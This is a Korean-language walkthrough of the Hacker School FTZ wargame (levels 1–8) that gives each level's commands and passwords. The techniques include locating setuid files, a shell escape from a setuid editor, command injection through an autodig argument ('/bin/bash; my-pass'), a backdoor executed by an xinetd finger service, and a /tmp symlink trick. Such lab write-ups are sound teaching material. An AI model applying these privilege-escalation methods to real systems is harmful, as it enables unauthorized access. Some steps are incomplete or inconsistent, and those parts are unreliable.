<h1>Hacker School FTZ</h1>

**Level1**

hint : Level2 권한에 setuid가 걸린 파일을 찾는다.

find / -user level2 -perm +4000

/bin/ExcuteMe

명령어 실행 bash

my-pass

Level2 Password : hacker or cracker



**Level2**

find / -user level3 -perm -4000

/usr/bin/editor

:!/bin/bash

my-pass

Level3 Password : can you fly?



**Level3**

autodig "/bin/bash; my-pass"

Level4 Password : suck my brain



**Level4**

/etc/xinetd.d/에 backdoor가 존재

cat backdoor

service finger
{
        disable = no
        flags           = REUSE
        socket_type     = stream
        wait            = no
        user            = level5
        server          = /home/level4/tmp/backdoor
        log_on_failure  += USERID
}

/home/level4/tmp 폴더에는 backdoor라는게 없음



vi backdoor.c

#include <stdio.h>

int main(){

​	system("my-pass");

​	return 0;

}



gcc -o backdoor backdoor.c

/home/level4/tmp/ 디렉터리 위치에 backdoor 파일을 생성

finger level4@localhost



Level5 Password : what is your name?



**Level5**

hint 

/usr/bin/level5 프로그램은 /tmp 디렉토리에
level5.tmp 라는 이름의 임시파일을 생성한다.

이를 이용하여 level6의 권한을 얻어라.



/usr/bin/ 폴더에 level5가 /tmp 디렉토리에 임시파일 생성

하지만 생성 후 삭제하는 것으로 추정

심볼릭 링크 설정

ln -s a level5.tmp

cd /tmp

cat a



Level6 Password : what the hell



**Level6**

hint - 인포샵 bbs의 텔넷 접속 메뉴에서 많이 사용되던 해킹 방법이다.

hint를 출력할 때 Ctrl + C를 누르면 level6 폴더로 이동한다

ls -al 명령어를 통해 password가 존재하는 것을 확인한 후

cat password 명령을 통해 password 확인



Level7 Password : come together



**Level7**

Level8 Password : break the world



**Level8**

hint : 2700 용량인 파일을 찾아라

find / -size 2700c 2> /dev/null

2> /dev/null은 아닌 것들 없애줌

/var/www/manual/ssl/ssl_intro_fig2.gif
/etc/rc.d/found.txt
/usr/share/man/man3/IO::Pipe.3pm.gz
/usr/share/man/man3/URI::data.3pm.gz

3가지 파일이 나오는데

/etc/rc.d/found.txt를 확인

